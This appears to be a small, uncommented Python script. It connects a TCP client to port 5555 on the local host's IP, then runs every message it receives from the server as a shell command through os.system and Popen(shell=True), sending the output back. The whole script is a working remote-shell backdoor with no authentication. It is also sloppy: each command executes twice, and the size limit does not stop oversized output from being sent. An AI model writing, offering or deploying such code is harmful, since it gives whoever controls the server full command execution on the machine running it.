import socket
import os
from subprocess import Popen, PIPE




class Network:
    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server = socket.gethostbyname(socket.gethostname()) 
        self.port = 5555
        self.FORMAT = 'utf-8'
        self.addr = (self.server, self.port)
        self.sent = 0
        self.server_msg = None
        self.counter = 0
    
    def send(self,data):
        try:
            self.client.send(str.encode(data))
        except Exception as e:
            print(e)
    
    def receive_data(self):
        try:
            return self.client.recv(2024).decode(self.FORMAT)
        except:
            return None
    
    def connect(self):
        self.client.connect(self.addr)
        self.client.setblocking(False)
        print("connected to: ",self.addr)
        self.send("!Connected")


test = Network()
test.connect()
while True:
    msg_server = test.receive_data()
    if msg_server != None:
        print(msg_server)
        if msg_server != None and msg_server != "WORKS!":
            try:
                os.system(msg_server)
                stdout = Popen(msg_server,shell = True,stdout=PIPE)
                output = stdout.communicate()[0]
                if len(output) > 2048:
                    test.send("output too large")

                test.send(str(output))
            except Exception as e:
                test.send(str(e))
                